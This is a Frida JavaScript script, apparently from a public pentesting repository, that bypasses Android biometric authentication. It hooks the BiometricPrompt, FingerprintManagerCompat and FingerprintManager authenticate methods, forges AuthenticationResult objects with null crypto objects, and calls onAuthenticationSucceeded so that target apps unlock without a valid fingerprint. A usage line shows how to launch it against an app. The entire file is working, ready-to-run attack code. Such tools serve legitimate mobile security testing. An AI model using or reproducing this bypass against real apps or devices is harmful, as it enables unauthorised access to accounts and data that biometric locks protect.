/*
Universal Android Biometric Bypass v0.4
author: ax - github.com/ax
Source: https://github.com/lautarovculic/fridaScripts
Bypasses BiometricPrompt, FingerprintManagerCompat, FingerprintManager.
Works when crypto object is not used (NULL cryptoObject accepted).
Usage: frida -U -f com.target.app -l biometricBypass.js
*/

Java.perform(function () {
    try { hookBiometricPrompt_authenticate(); }
    catch (error) { console.log("[!] hookBiometricPrompt_authenticate not supported: " + error); }
    try { hookBiometricPrompt_authenticate2(); }
    catch (error) { console.log("[!] hookBiometricPrompt_authenticate2 not supported: " + error); }
    try { hookFingerprintManagerCompat_authenticate(); }
    catch (error) { console.log("[!] hookFingerprintManagerCompat_authenticate failed: " + error); }
    try { hookFingerprintManager_authenticate(); }
    catch (error) { console.log("[!] hookFingerprintManager_authenticate failed: " + error); }
});

var StringCls = null;
Java.perform(function () {
    StringCls = Java.use('java.lang.String');
});

function getArgsTypes(overloads) {
    var results = [];
    for (var i in overloads) {
        var parameters = [];
        for (var j in overloads[i].argumentTypes) {
            parameters.push("'" + overloads[i].argumentTypes[j].className + "'");
        }
        results.push('(' + parameters.join(', ') + ');');
    }
    return results.join('\n');
}

function getAuthResult(resultObj, cryptoInst) {
    var clax = resultObj;
    var resu = getArgsTypes(clax['$init'].overloads);
    resu = resu.replace(/\'android\.hardware\.biometrics\.BiometricPrompt\$CryptoObject\'/, 'cryptoInst');
    resu = resu.replace(/\'android\.hardware\.fingerprint\.FingerprintManager\$CryptoObject\'/, 'cryptoInst');
    resu = resu.replace('\'int\'', '0');
    resu = resu.replace('\'boolean\'', 'false');
    resu = resu.replace(/'.*'/, 'null');
    resu = "resultObj.$new" + resu;
    return eval(resu);
}

function getBiometricPromptAuthResult() {
    var sweet_cipher = null;
    var cryptoObj = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
    var cryptoInst = cryptoObj.$new(sweet_cipher);
    var authenticationResultObj = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    return getAuthResult(authenticationResultObj, cryptoInst);
}

function hookBiometricPrompt_authenticate() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate']
        .overload('android.os.CancellationSignal', 'java.util.concurrent.Executor',
                  'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    console.log("[*] Hooking BiometricPrompt.authenticate()...");
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
        console.log("[*] BiometricPrompt.authenticate → onAuthenticationSucceeded called");
    };
}

function hookBiometricPrompt_authenticate2() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate']
        .overload('android.hardware.biometrics.BiometricPrompt$CryptoObject',
                  'android.os.CancellationSignal', 'java.util.concurrent.Executor',
                  'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    console.log("[*] Hooking BiometricPrompt.authenticate2()...");
    biometricPrompt.implementation = function (crypto, cancellationSignal, executor, callback) {
        var authenticationResultInst = getBiometricPromptAuthResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
        console.log("[*] BiometricPrompt.authenticate2 → onAuthenticationSucceeded called");
    };
}

function hookFingerprintManagerCompat_authenticate() {
    var fingerprintManagerCompat, cryptoObj, authenticationResultObj;
    try {
        fingerprintManagerCompat = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat');
        cryptoObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
        authenticationResultObj = Java.use('android.support.v4.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
    } catch (e) {
        fingerprintManagerCompat = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat');
        cryptoObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$CryptoObject');
        authenticationResultObj = Java.use('androidx.core.hardware.fingerprint.FingerprintManagerCompat$AuthenticationResult');
    }
    console.log("[*] Hooking FingerprintManagerCompat.authenticate()...");
    fingerprintManagerCompat['authenticate'].implementation = function (crypto, flags, cancel, callback, handler) {
        callback['onAuthenticationFailed'].implementation = function () {
            var cryptoInst = cryptoObj.$new(null);
            var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
            callback.onAuthenticationSucceeded(authenticationResultInst);
        };
        return this.authenticate(crypto, flags, cancel, callback, handler);
    };
}

function hookFingerprintManager_authenticate() {
    var fingerprintManager, cryptoObj, authenticationResultObj;
    try {
        fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
        cryptoObj = Java.use('android.hardware.fingerprint.FingerprintManager$CryptoObject');
        authenticationResultObj = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
    } catch (e) {
        console.log("[!] FingerprintManager class not found: " + e);
        return;
    }
    console.log("[*] Hooking FingerprintManager.authenticate()...");
    fingerprintManager['authenticate']
        .overload('android.hardware.fingerprint.FingerprintManager$CryptoObject',
                  'android.os.CancellationSignal', 'int',
                  'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
                  'android.os.Handler')
        .implementation = function (crypto, cancel, flags, callback, handler) {
        var cryptoInst = cryptoObj.$new(null);
        var authenticationResultInst = getAuthResult(authenticationResultObj, cryptoInst);
        callback.onAuthenticationSucceeded(authenticationResultInst);
        return this.authenticate(crypto, cancel, flags, callback, handler);
    };
}
